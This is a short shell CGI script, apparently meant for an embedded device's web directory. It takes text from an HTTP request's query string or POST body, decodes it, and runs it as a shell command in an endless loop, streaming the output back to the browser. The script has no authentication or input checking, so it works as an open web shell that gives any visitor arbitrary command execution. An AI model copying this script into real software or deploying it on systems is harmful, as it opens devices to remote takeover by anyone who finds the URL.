#!/bin/sh
#Notice: this cgi file must be put at dir"/usr/share/www/cgi/"

if [ "$REQUEST_METHOD" = "POST" ]; then
	strparam=`cat $stdin | cut -c1-$CONTENT_LENGTH`
else
	strparam=$QUERY_STRING
fi

strparam=`/usr/bin/decode.sh $strparam`

echo "HTTP/1.1 200"
echo "Content-type: multipart/x-mixed-replace; boundary=--ThisRandomString--"
echo ""
echo "--ThisRandomString--"
while true
do
    echo "Content-type: text/html"
    echo ""
    echo "<pre>"
    date '+%Y/%m/%e %H:%M:%S'
    echo "REQUEST_METHOD = ${REQUEST_METHOD}"
    echo "QUERY_STRING = ${QUERY_STRING}"

    #ls 

	echo "Run command $strparam"
    ${strparam}
    echo "</pre>"
    echo "--ThisRandomString--"
    sleep 2
done

